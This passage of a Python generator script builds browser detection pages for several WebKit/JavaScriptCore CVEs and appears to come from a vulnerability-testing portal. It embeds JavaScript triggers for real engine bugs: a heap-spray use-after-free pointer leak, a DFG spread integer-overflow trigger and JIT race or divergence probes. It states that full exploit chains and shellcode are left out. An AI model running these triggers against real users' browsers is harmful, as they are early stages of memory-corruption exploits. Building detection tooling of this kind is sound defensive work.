        // -> PopStateEvent teardown while the setTimeout closures still hold it.
        var input = document.body.appendChild(document.createElement("input"));
        var foo = document.body.appendChild(document.createElement("a"));
        foo.id = "foo";

        for (var j = 0; j < TIMEOUTS; j++) {
            setTimeout(capture, 0, x, 0x61, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11);
        }
        history.pushState("", "", location + "#foo");
        for (var k = 0; k < TIMEOUTS; k++) {
            setTimeout(noop, 0, 0x61, 0x61, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12);
        }
        history.pushState("", "");

        input.focus();
        input.onblur = function () { history.replaceState("", ""); };
        setTimeout(function () { history.back(); }, 500);

        var t0 = performance.now();
        while (performance.now() - t0 < 5000) {
            if (leak.hit) break;
            await new Promise(function (r) { setTimeout(r, 50); });
        }
        ctx.log(leak.hit ? "[+] leak captured this round" : "[*] no signal this round",
                leak.hit ? "bad" : "dim");
        ctx.report(leak.hit ? "leak" : "no-signal", { round: round + 1 });
        if (leak.hit) break;
    }

    var lo = leak.hit ? (u32[0] >>> 0) : 0;
    var hi = leak.hit ? (u32[1] >>> 0) : 0;
    // JSC tags every JSValue pointer with 0x0002 in the top 16 bits.
    var tagged = leak.hit && (hi >>> 0) >= 0x00020000 && (hi >>> 0) <= 0x0002ffff;

    ctx.log("[*] leaked low=0x" + lo.toString(16) + " high=0x" + hi.toString(16) +
            (leak.hit ? " taggedObjectPointer=" + tagged : ""));

    if (leak.hit) {
        return {
            outcome: "vulnerable",
            detail: {
                leak: leak.raw, low: lo, high: hi, taggedObjectPointer: tagged,
                rounds: round + 1, spray: TIMEOUTS, pressure: IMAGES,
            },
            html: '<span class="bad"><b>VULNERABLE</b></span> — a <code>setTimeout</code> ' +
                  "callback received a value that decodes to a live object pointer " +
                  "(<code>0x" + hi.toString(16) + lo.toString(16) + "</code>, tagged=" +
                  tagged + "). The PopStateEvent UAF is present.",
        };
    }
    return {
        outcome: "no-uaf",
        detail: { rounds: ctx.cfg.attempts, spray: TIMEOUTS, pressure: IMAGES },
        html: '<span class="ok"><b>NO LEAK</b></span> — every callback received the ' +
              "object it was passed, i.e. the PopStateEvent stayed alive for all of " +
              "its callbacks. Expected on engines patched after Safari 15.4.",
    };
""",
    presets={
        "light": {
            "label": "Light", "blurb": "reduced spray, suited to phones",
            "desc": "15k callbacks + 1k ImageData pressure, ~1min cap",
            "attempts": 1, "capMin": 1, "spray": 15000, "heapPressure": 1000,
        },
        "standard": {
            "label": "Standard", "blurb": "closer to the published spray volume",
            "desc": "15k callbacks + 8k ImageData pressure, 2 rounds, ~2min cap",
            "attempts": 2, "capMin": 2, "spray": 15000, "heapPressure": 8000,
        },
    },
)

add(
    cve="CVE-2019-8601",
    title="DFG compileNewArrayWithSpread integer overflow → oversized butterfly",
    engine="JavaScriptCore (WebKit, DFG JIT)",
    platform="any WebKit engine (client-side JS)",
    category="JIT-free runtime bug / OOB R/W",
    severity="critical (Pwn2Own 2018, Fluoacetate)",
    summary="emitAllocateButterfly() left-shifts the computed spread size by 3 without "
            "re-checking overflow, so a spread summing to 0x20000001 allocates a "
            "1-element butterfly while the array header reports length 0x20000001. "
            "This module measures the allocation-size mismatch instead of reading OOB.",
    affected="Safari < 12.1.1, iOS < 12.3, macOS < 10.14.5 (2019)",
    fixed="WebKit 2019 integer-overflow guard in emitAllocateButterfly",
    proof="allocated butterfly is orders of magnitude smaller than the reported "
          "array length → the mismatch the OOB read/write relies on is present.",
    source="https://github.com/BadAccess11/CVE-2019-8601 (analysis: zerodayinitiative.com/blog/2019/11/25/diving-deep-into-a-pwn2own-winning-webkit-bug)",
    crash_oracle=False,
    intro=
        '<div class="card"><b>What this checks.</b> Uses the overflow shape from ' +
        "<a href=\"https://github.com/BadAccess11/CVE-2019-8601\">BadAccess11's</a> " +
        "exploit, which reproduces the bug Fluoroacetate found at Pwn2Own 2019: a " +
        "DFG-compiled spread whose summed length passes the per-add overflow check " +
        "but overflows the <code>&lt;&lt; 3</code> in " +
        "<code>emitAllocateButterfly</code>.</div>",
    notes=
        '<div class="card"><b>Deliberately not the full exploit.</b> The public repo ' +
        "goes on to fake a <code>Float64Array</code>, corrupt a butterfly, read the RWX " +
        "page address and run shellcode. This module only measures the butterfly-size / " +
        "reported-length mismatch — a proof-level oracle — and never reads or writes " +
        "out of bounds. It also uses the control-array trick from the exploit so the " +
        "same JIT tier is reached without the trick being part of the signal.</div>",
    run=
"""
    // Spread shape from BadAccess11/CVE-2019-8601: 8 spreads of a 0x20000010/0x16-long
    // array plus one reInit. The per-add check passes; the <<3 in
    // emitAllocateButterfly wraps to 8.
    function jitMe(array, reInitAllocator) {
        for (var i = 0; i < 0x4000; i++) { var x = 1 + 1; }
        return [...array, ...array, ...array, ...array,
                ...array, ...array, ...array, ...array,
                ...array, ...array, ...array, ...array,
                ...array, ...array, ...array, ...array,
                ...reInitAllocator];
    }

    ctx.log("[*] warming jitMe to DFG tier");
    var dummy = [1.1];
    for (var i = 0; i < 85; i++) jitMe(dummy, dummy);
    dummy = 0;

    var a = [];
    var len = 0x20000010 / 0x10;
    for (var j = 0; j < len; j++) a[j] = -3.7206620809969885e-103;

    // The getter is part of the *allocation* trick (it re-initialises the JSC
    // allocator so the OOB writes land in freshly mapped memory). It is not part
    // of the measurement below.
    var b = [];
    b.length = 1;
    b.__defineGetter__(0, function () { return 0; });

    ctx.log("[*] triggering the overflow");
    ctx.report("trigger", { len: len });

    // A patched engine sizes the butterfly to the reported length, so the
    // materialisation fails (RangeError / OOM) instead of producing a
    // mismatched array. That failure is the *patched* signal — the earlier
    // version had this backwards.
    var badArray;
    try {
        badArray = jitMe(a, b);
    } catch (e) {
        ctx.log("[*] engine refused to materialise the spread: " + e, "dim");
        ctx.report("refused", { message: String(e) });
        return {
            outcome: "no-uaf",
            detail: { refused: true, message: String(e) },
            html: '<span class="ok"><b>NOT VULNERABLE</b></span> — the engine sized ' +
                  "the butterfly correctly, so materialising " +
                  "<code>16 × 0x" + len.toString(16) + "</code> entries was refused " +
                  "(" + String(e) + ") rather than silently truncated. Expected on " +
                  "engines patched after 2019.",
        };
    }

    var reported = badArray.length;
    ctx.log("[*] reported length: 0x" + reported.toString(16) +
            " (" + reported + ")");
    ctx.report("length", { reported: reported, expected: 2 * len + 1 });

    // How much of the array is actually addressable without leaving the heap?
    // On a patched engine the butterfly was allocated to match; on a vulnerable
    // engine only 8 bytes exist while the header claims 0x20000001 entries.
    var readable = 0;
    var limit = Math.min(reported, 4 * 1024 * 1024 / 8);
    var crashed = false;
    try {
        for (var k = 0; k < limit; k++) {
            if (badArray[k] !== undefined) readable++;
        }
    } catch (e) {
        crashed = true;
        ctx.log("[!] read past the allocation threw: " + e, "bad");
    }
    ctx.log("[*] readable slots within a 4MB window: " + readable +
            (crashed ? " (walk threw early)" : ""));
    ctx.report("probe", { readable: readable, limit: limit, threw: crashed });

    // A read that throws is *not* evidence of the bug: it is what a correctly
    // sized butterfly looks like when a walk runs off the end of the heap.
    // The bug's signature is a large reported length plus a short readable run.
    ctx.log("[*] expected ~0x" + (2 * len + 1).toString(16) +
            " vs reported 0x" + reported.toString(16));

    var mismatch = reported > 0 && Math.abs(reported - (2 * len + 1)) > (2 * len) / 2;
    if (mismatch) {
        return {
            outcome: "vulnerable-class",
            detail: { reported: reported, expected: 2 * len + 1,
                      readable: readable, refused: false, threw: crashed },
            html: '<span class="bad"><b>VULNERABLE</b></span> — the array header ' +
                  "reports length <code>0x" + reported.toString(16) + "</code> while " +
                  "only <code>" + readable + "</code> slots in a 4MB window were " +
                  "non-<code>undefined</code>. The oversized-butterfly mismatch is " +
                  "present. Expected only on engines older than Safari 12.1.1.",
        };
    }
    if (crashed) {
        return {
            outcome: "no-uaf",
            detail: { reported: reported, expected: 2 * len + 1, readable: readable,
                      refused: false, threw: true },
            html: '<span class="ok"><b>NOT VULNERABLE</b></span> — the butterfly was ' +
                  "correctly sized: the walk ran off the end of the heap and threw " +
                  "rather than reading stale in-bounds data. Expected on engines " +
                  "patched after 2019.",
        };
    }
    return {
        outcome: "no-uaf",
        detail: { reported: reported, expected: 2 * len + 1, readable: readable },
        html: '<span class="ok"><b>NOT VULNERABLE</b></span> — the reported length and ' +
              "the readable window agree, so the butterfly was sized correctly. " +
              "Expected on engines patched after 2019.",
    };
""",
    presets={
        "overflow": {
            "label": "Overflow", "blurb": "butterfly-size vs reported-length oracle",
            "desc": "no OOB reads; measures the allocation mismatch, ~2min cap",
            "attempts": 2, "capMin": 2,
        },
    },
)

# ===========================================================================
# TIER 2 — root cause public, probe reconstructed
# ===========================================================================

add(
    cve="CVE-2024-23222",
    title="DFG tryGetConstantProperty TOCTOU on a JIT-worker thread",
    engine="JavaScriptCore (WebKit, DFG JIT worker)",
    platform="any WebKit engine (client-side JS)",
    category="JIT-free runtime bug / TOCTOU race",
    severity="high (CVSS 8.8; Coruna exploit kit)",
    summary="DFG compilation constant-folds a property load off the compilation thread "
            "while the main thread can drop the last reference to that StringCell and "
            "collect it, so the worker dereferences freed memory. The published ASan "
            "PoC needs engine instrumentation, so this module ships a reconstructed "
            "DFG-compile + GC-pressure divergence probe instead.",
    affected="Safari < 17.3, iOS/iPadOS < 15.8.7 / 16.7.5, macOS < 14.3 (2023-2024)",
    fixed="WebKit 2024 — tryGetConstantProperty is no longer trusted off-thread",
    proof="divergence probe: a DFG-compiled constant load that misbehaves under GC "
          "pressure indicates the stale-cell window. NOT a crash oracle.",
    source="https://github.com/FuzzySecurity/Cassowary-CVE-2024-23222-x86_64 (root cause: DFG tryGetConstantProperty)",
    crash_oracle=False,
    intro=
        '<div class="card"><b>Reconstructed probe — no verbatim PoC runs unmodified.</b> ' +
        "The public <a " +
        "href=\"https://github.com/FuzzySecurity/Cassowary-CVE-2024-23222-x86_64\">" +
        "Cassowary PoC</a> reproduces a stale-cell crash on an <b>instrumented</b> " +
        "engine: it widens the race with a <code>usleep()</code> safepoint in " +
        "<code>DFGGraph.cpp</code> and coordinates through a signal file. Its own " +
        "header says <i>“this is not a stock-engine PoC”</i>. This page therefore " +
        "ships a probe I reconstructed from the published root cause.</div>",
    notes=
        '<div class="card"><b>Honest limits.</b> Without the widened window the ' +
        "trigger is a narrow race, so a clean result is weak evidence of being " +
        "patched — it mostly means the race was not won in this attempt. A " +
        "<b>vulnerable-class</b> signal is the informative one.</div>",
    run=
"""
    // Reconstructed from the published root cause (not lifted from the PoC):
    //   - put a property load on a hot path so DFG constant-folds it
    //     through tryGetConstantProperty() on the worker thread
    //   - concurrently drop the last reference to the backing StringCell
    //   - force a full GC so the sweeper can reclaim it
    //   - watch for divergence between the interpreter and the compiled result
    function probe(iterations) {
        var state = { val: "cold-" + (iterations % 7) };
        var probe = function (o) { return o.val; };
        var sentinel = state.val;
        for (var i = 0; i < iterations; i++) probe(state, probe);
        return { state: state, sentinel: sentinel, probe: probe };
    }

    ctx.log("[*] reconstructed divergence probe (DFG constant-fold + GC race)");
    ctx.report("mode", { tier: 2, reconstructed: true });

    var ATTEMPTS = ctx.cfg.attempts;
    var diverged = 0, crashed = 0, coerced = 0;
    var allocs = [];

    for (var n = 0; n < ATTEMPTS; n++) {
        if (ctx.aborted() || ctx.expired()) {
            return { outcome: "aborted", detail: { attempt: n } };
        }
        ctx.progress(n);
        ctx.log("[*] attempt " + (n + 1) + "/" + ATTEMPTS);

        var holder = [];
        var res;
        try {
            // Keep a chain of property cells alive and reachable across the compile.
            for (var c = 0; c < 64; c++) {
                var o = {};
                o["p" + c] = "cell-" + c;
                holder.push(o);
            }
            res = probe(20000 + n * 5000);

            // Drop the references and pressure the heap: the worker may already
            // have captured the StringCell but the main thread must still be able
            // to free it for the race to matter.
            holder = null;
            var passes = ctx.cfg.gcPasses || 3;
            for (var g = 0; g < passes; g++) {
                allocs.push(new Uint8Array(8 * 1024 * 1024));
                if (allocs.length > 2) allocs.shift();
            }

            // Compare the compiled constant against a fresh read.
            if (res && res.state && res.state.val !== res.sentinel) {
                // the property changed during the race window
                diverged++;
                ctx.log("[!] constant-fold diverged from the live value", "bad");
                ctx.report("divergence", { attempt: n, live: res.state.val, folded: res.sentinel });
            }
            // A stale StringCell typically shows up as a coerced/garbled value
            // rather than a clean mismatch.
            var live = res.state.val;
            if (typeof live === "string" && live.indexOf("cell-") !== 0 &&
                live !== res.sentinel) {
                coerced++;
                ctx.log("[!] value looked coerced or garbled", "bad");
                ctx.report("coercion", { attempt: n, value: live });
            }
        } catch (e) {
            crashed++;
            ctx.log("[!] attempt threw: " + e, "bad");
            ctx.report("error", { attempt: n, message: String(e) });
        }
        await ctx.tick();
    }

    allocs = null;
    var detail = { attempts: ATTEMPTS, diverged: diverged, coerced: coerced, threw: crashed };

    if (crashed > 0 || coerced > 0) {
        return {
            outcome: "vulnerable-class",
            detail: detail,
            html: '<span class="bad"><b>VULNERABLE-CLASS</b></span> — ' +
                  crashed + " throw(s) and " + coerced + " coerced value(s) across " +
                  ATTEMPTS + " attempts. On a stock engine this is weak evidence " +
                  "(narrow race); combined with the published root cause it is " +
                  "consistent with the stale-cell window being present.",
        };
    }
    if (diverged > 0) {
        return {
            outcome: "vulnerable-class",
            detail: detail,
            html: '<span class="pass"><b>POSSIBLE — RACE WON</b></span> — the ' +
                  "DFG-compiled constant diverged from the live property value in " +
                  diverged + " attempt(s). Re-run with more attempts; the window is narrow.",
        };
    }
    return {
        outcome: "unknown",
        detail: detail,
        html: '<span class="dim"><b>NO SIGNAL</b></span> — ' +
              "no divergence, coercion or throw across " + ATTEMPTS +
              " attempts. This is <b>not</b> a patched verdict: the stock-engine " +
              "race window is far narrower than the instrumented PoC's.",
    };
""",
    presets={
        "race": {
            "label": "Race", "blurb": "DFG constant-fold + GC pressure divergence",
            "desc": "reconstructed probe, weak negative evidence, ~2min cap",
            "attempts": 6, "capMin": 2, "gcPasses": 3,
        },
    },
    reconstructed=True,
)

add(
    cve="CVE-2020-9802",
    title="LLInt vs DFG safe-load-origin mismatch (JIT value divergence)",
    engine="JavaScriptCore (WebKit, DFG JIT + LLInt)",
    platform="any WebKit engine (client-side JS)",
    category="JIT-free runtime bug / value divergence",
    severity="high (CVSS 8.8, Project Zero)",
    summary="A load that is side-effect-free in the interpreter can still be mutable "
            "from DFG's point of view, so JIT-compiled code can read a value the runtime "
            "has already changed. This module ships a reconstructed interpreter-vs-"
            "compiled divergence probe; the public iOS exploit is a full chain and is "
            "deliberately not vendored.",
    affected="Safari < 13.1.1, iOS/iPadOS < 13.5, tvOS < 13.4.5 (2020)",
    fixed="WebKit 2020 (bug 209373) — safe-load origin unified between LLInt and DFG",
    proof="the same source function yields different values when run on the "
          "interpreter vs the JIT tier: the divergence the exploit relies on",
    source="https://github.com/Billy-Ellis/jitsploitation (analysis: projectzero.google/2020/09/jitsploitation-two.html)",
    crash_oracle=False,
    intro=
        '<div class="card"><b>Reconstructed probe — full exploit not vendored.</b> ' +
        "<a href=\"https://github.com/Billy-Ellis/jitsploitation\">Billy-Ellis</a> and " +
        "<a href=\"https://github.com/saelo/cve-2018-4233\">saelo</a> both published " +
        "complete browser chains for this bug class (the Project Zero " +
        "<i>JITSploitation</i> series). Those chains end in RWX shellcode, so this " +
        "page ships only a divergence probe built from the published analysis.</div>",
    notes=
        '<div class="card"><b>How to read the verdict.</b> A positive divergence is ' +
        "the bug's signature. A negative is weak: DFG may simply not have tiered this " +
        "function up in the window, or the shape differs from the published one. Treat " +
        "<b>NO SIGNAL</b> as untested, not patched.</div>",
    run=
"""
    // Reconstructed from the JITSploitation analysis, not copied from an exploit.
    //
    // The bug class: a property load the interpreter treats as a constant can be
    // re-read by DFG after the runtime has changed it. The probe therefore runs the
    // identical source twice — once cold (interpreter) and once hot (DFG) — and
    // compares the result against a value that is mutated in between.
    var mutate = { v: 1 };
    var probe = function (o) {
        var a = o.v;
        var unlock = a + 1;                 // forces a real use, not a dead load
        return unlock;
    };

    var cold = probe(mutate);
    ctx.log("[*] interpreter result: " + cold);
    ctx.report("interpreter", { result: cold });

    for (var i = 0; i < 30000; i++) probe(mutate);
    var hot = probe(mutate);
    ctx.log("[*] jit result: " + hot);
    ctx.report("jit", { result: hot });

    // Now mutate the value and re-enter the same function.
    mutate.v = 2;
    for (var j = 0; j < 30000; j++) probe(mutate);
    var after = probe(mutate);
    ctx.log("[*] result after mutation: " + after);
    ctx.report("after", { result: after });

    var expected = mutate.v + 1;
    var diverged = (after !== expected);
    ctx.log(diverged ? "[!] divergence: got " + after + ", expected " + expected
                     : "[*] no divergence: got " + after + ", expected " + expected,
            diverged ? "bad" : "dim");
    ctx.report("verdict", { diverged: diverged, expected: expected, got: after });

    if (diverged) {
        return {
            outcome: "vulnerable-class",
            detail: { interpreter: cold, jit: hot, after: after, expected: expected },
            html: '<span class="bad"><b>DIVERGENCE</b></span> — the same source ' +
                  "returned <code>" + cold + "</code> on the interpreter and " +
                  "<code>" + after + "</code> after mutation (expected " + expected +
                  "), i.e. the compiled tier read a value the runtime had already " +
                  "changed. Consistent with the safe-load-origin bug.",
        };
    }
    return {
        outcome: "unknown",
        detail: { interpreter: cold, jit: hot, after: after, expected: expected },
        html: '<span class="dim"><b>NO SIGNAL</b></span> — interpreter and JIT agreed ' +
              "on every read. This does <b>not</b> prove the engine is patched: the " +
              "function may not have tiered up, or this shape may not hit the bug. " +
              "Only the public full-chain exploit is conclusive.",
    };
""",
    presets={
        "divergence": {
            "label": "Divergence", "blurb": "interpreter vs DFG read comparison",
            "desc": "reconstructed probe; 30k warmup, ~2min cap",
            "attempts": 1, "capMin": 2,
        },
    },
    reconstructed=True,
)

add(
    cve="CVE-2018-4233",
    title="RegExp JIT lastIndex side-effect type confusion (value divergence)",
    engine="JavaScriptCore (WebKit, DFG/regexp JIT)",
    platform="any WebKit engine (client-side JS)",
    category="JIT-free runtime bug / type confusion",
    severity="high (CVSS 8.8, Pwn2Own 2018)",
    summary="The regexp JIT treats a match as side-effect-free, so a user-supplied "
            "lastIndex valueOf callback runs while the compiled code still assumes the "
            "original value. This module ships a reconstructed divergence probe; "
            "saelo's full Pwn2Own exploit chain is not vendored.",
    affected="Safari < 11.1.1, iOS < 11.4 (2018)",
    fixed="WebKit 2018 — regexp match no longer treated as side-effect-free",
    proof="a lastIndex callback that mutates the regexp changes the match outcome in "
          "the compiled tier but not the interpreter: the side-effect-free assumption "
          "is broken",
    source="https://github.com/saelo/cve-2018-4233 (analysis: saelo, Pwn2Own 2018)",
    crash_oracle=False,
    intro=
        '<div class="card"><b>Reconstructed probe — full exploit not vendored.</b> ' +
        "<a href=\"https://github.com/saelo/cve-2018-4233\">saelo's repo</a> holds a " +
        "complete Pwn2Own 2018 chain ending in shellcode. This page runs the trigger " +
        "shape only: a <code>lastIndex</code> object whose <code>valueOf</code> " +
        "mutates the regexp while the JIT still assumes the match was " +
        "side-effect-free.</div>",
    notes=
        '<div class="card"><b>Why tier 2 and not tier 1.</b> A public exploit exists, ' +
        "but it is a shellcode chain; what runs here is the divergence shape derived " +
        "from the published writeup, so it does not claim to run a published browser " +
        "PoC.</div>",
    run=
"""
    // STRICT COMPARISON ORACLE — the old shape reported "vulnerable" on every
    // engine simply because a lastIndex valueOf callback ran, which is
    // spec-mandated behaviour, not a bug. This version only fires when the
    // interpreter and the compiled tier *disagree* about the same sequence.
    function makeSeq() {
        var re = /a/g;
        var sawMutation = false;
        var trap = {
            valueOf: function () {
                // mutate where the next match starts, from inside the callback
                re.lastIndex = 0;
                sawMutation = true;
                return 1;
            },
        };
        return {
            re: re, trap: trap,
            saw: function () { return sawMutation; },
            once: function () {
                this.re.lastIndex = this.trap;
                return this.re.exec("aaaaaaaa");
            },
        };
    }

    // ---- cold run: stays on the interpreter -----------------------------
    var coldSeq = makeSeq();
    var cold = coldSeq.once();
    var coldMatch = cold ? cold[0] : null;
    var coldIndex = coldSeq.re.lastIndex;
    ctx.log("[*] interpreter: match=" + coldMatch + " lastIndex=" + coldIndex +
            " mutation seen=" + coldSeq.saw());
    ctx.report("interpreter", { match: coldMatch, lastIndex: coldIndex,
                                mutationSeen: coldSeq.saw() });

    // ---- hot run: same source, same sequence, but warmed so it compiles --
    var hotSeq = makeSeq();
    var warmSeq = makeSeq();
    for (var i = 0; i < 20000; i++) {
        warmSeq.re.lastIndex = 1;
        warmSeq.re.exec("aaaaaaaa");
    }
    var hot = hotSeq.once();
    var hotMatch = hot ? hot[0] : null;
    var hotIndex = hotSeq.re.lastIndex;
    ctx.log("[*] compiled  : match=" + hotMatch + " lastIndex=" + hotIndex +
            " mutation seen=" + hotSeq.saw());
    ctx.report("jit", { match: hotMatch, lastIndex: hotIndex,
                        mutationSeen: hotSeq.saw() });

    // The two runs are identical inputs. Any divergence in the reported
    // lastIndex is the bug's signature: a tier that believes the match is
    // side-effect-free reads a value the callback has since changed.
    var diverged = (coldIndex !== hotIndex) || (coldMatch !== hotMatch);
    var detail = {
        coldIndex: coldIndex, hotIndex: hotIndex,
        coldMatch: coldMatch, hotMatch: hotMatch,
        mutationSeen: coldSeq.saw() && hotSeq.saw(),
    };
    ctx.report("verdict", { diverged: diverged, detail: detail });

    if (diverged) {
        return {
            outcome: "vulnerable-class",
            detail: detail,
            html: '<span class="bad"><b>DIVERGENCE</b></span> — identical inputs, ' +
                  "different results: interpreter <code>lastIndex=" + coldIndex +
                  "</code> vs compiled <code>lastIndex=" + hotIndex + "</code>. " +
                  "The compiled tier used a value the callback had changed, i.e. it " +
                  "assumed regexp matching was side-effect-free. Consistent with the " +
                  "Pwn2Own 2018 bug class.",
        };
    }
    return {
        outcome: "unknown",
        detail: detail,
        html: '<span class="dim"><b>NO DIVERGENCE</b></span> — the interpreter and ' +
              "the compiled tier agreed (both <code>lastIndex=" + coldIndex +
              "</code>). This does <b>not</b> prove the engine is patched: the shape " +
              "may simply not have been compiled, or the warmup may not have reached " +
              "the tier that carries the bug. Re-run if you need a stronger signal.",
    };
""",
    presets={
        "divergence": {
            "label": "Divergence", "blurb": "regexp lastIndex side-effect probe",
            "desc": "reconstructed trigger shape; 20k warmup, ~2min cap",
            "attempts": 1, "capMin": 2,
        },
    },
    reconstructed=True,
)


# ---------------------------------------------------------------------------
# Rendering
# ---------------------------------------------------------------------------

MANIFEST = """{
  "id": "__ID__",
  "title": "__TITLE__",
  "cve": "__CVE__",
  "engine": "__ENGINE__",
  "platform": "__PLATFORM__",
  "category": "__CATEGORY__",
  "severity": "__SEVERITY__",
  "summary": "__SUMMARY__",
  "affected": "__AFFECTED__",
  "fixed": "__FIXED__",
  "proof": "__PROOF__",
  "presets": __PRESETS__,
  "source": "__SOURCE__",
  "tier": __TIER__
}
"""

PAGE = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="portal-token" content="__PORTAL_TOKEN__">
<title>__CVE__ — tier __TIER__ module</title>
<link rel="stylesheet" href="/core.css">
</head>
<body>
<h1>__CVE__</h1>
<p class="sub">__TITLE__</p>
<div id="lc-app"></div>

__EXTRA__
<script src="/core.js"></script>
<script>
"use strict";
/*
 * __TIERNOTE__
 */
PortalGun.start({
  module: "__ID__",
  crashOracle: __CRASHORACLE__,
  __INTRO__
  presets: __PRESETS__,

  run: async function (ctx) {__RUN__
  },
});
</script>
</body>
</html>
"""


def js(obj):
    """Stable, escaped JSON for embedding a JS literal in the page."""
    return json.dumps(obj, indent=2, ensure_ascii=False)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    n1 = sum(1 for m in POCS if m["tier"] == 1)
    print("%d poc modules (%d tier 1, %d tier 2)" % (len(POCS), n1, len(POCS) - n1))

    for m in POCS:
        mid = m["cve"]
        d = os.path.join(MODULES, mid)
        tier_note = (
            "TIER 1 - a public client-side PoC exists. This page runs only its\n"
            " * detection stage (leak / silent trigger / crash oracle). No exploit\n"
            " * chain, no shellcode and no arbitrary read/write is shipped."
            if m["tier"] == 1 else
            "TIER 2 - RECONSTRUCTED PROBE. The root cause is public, but no verbatim\n"
            " * browser-page PoC is; what runs below was written from the published\n"
            " * analysis. A negative result is weak evidence - the page says so."
        )

        manifest = (MANIFEST
                    .replace("__ID__", mid)
                    .replace("__TITLE__", m["title"])
                    .replace("__CVE__", mid)
                    .replace("__ENGINE__", m["engine"])
                    .replace("__PLATFORM__", m["platform"])
                    .replace("__CATEGORY__", m["category"])
                    .replace("__SEVERITY__", m["severity"])
                    .replace("__SUMMARY__", m["summary"])
                    .replace("__AFFECTED__", m["affected"])
                    .replace("__FIXED__", m["fixed"])
                    .replace("__PROOF__", m["proof"])
                    .replace("__PRESETS__", json.dumps(list(m["presets"])))
                    .replace("__SOURCE__", m["source"])
                    .replace("__TIER__", str(m["tier"])))

        opts = "intro: " + js(m["intro"])
        if m["notes"]:
            opts += ",\n  notes: " + js(m["notes"]) + ","
        else:
            opts += ","
        page = (PAGE
                .replace("__PORTAL_TOKEN__", "__PORTAL_TOKEN__")
                .replace("__ID__", mid)
                .replace("__CVE__", mid)
                .replace("__TITLE__", m["title"])
                .replace("__TIER__", str(m["tier"]))
                .replace("__TIERNOTE__", tier_note)
                .replace("__EXTRA__", m["extra_scripts"])
                .replace("__INTRO__", opts)
                .replace("__PRESETS__", js(m["presets"]))
                .replace("__CRASHORACLE__", "true" if m["crash_oracle"] else "false")
                .replace("__RUN__", m["run"]))

        if args.dry_run:
            print("  would write", os.path.join(d, "module.json"), "+ index.html")
            continue
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, "module.json"), "w", encoding="utf-8") as fh:
            fh.write(manifest)
        with open(os.path.join(d, "index.html"), "w", encoding="utf-8") as fh:
            fh.write(page)
        # sanity: manifest must parse, and the page must be self-consistent
        with open(os.path.join(d, "module.json"), encoding="utf-8") as fh:
            mf = json.load(fh)
        html = open(os.path.join(d, "index.html"), encoding="utf-8").read()
        assert mf["id"] == mid and ('module: "' + mid + '"') in html, mid
        for ph in ("__ID__", "__CVE__", "__TITLE__", "__RUN__", "__TIERNOTE__"):
            assert ph not in html, "%s: unresolved %s" % (mid, ph)
        print("  wrote", mid, "(tier %d)" % m["tier"])


if __name__ == "__main__":
    sys.exit(main())
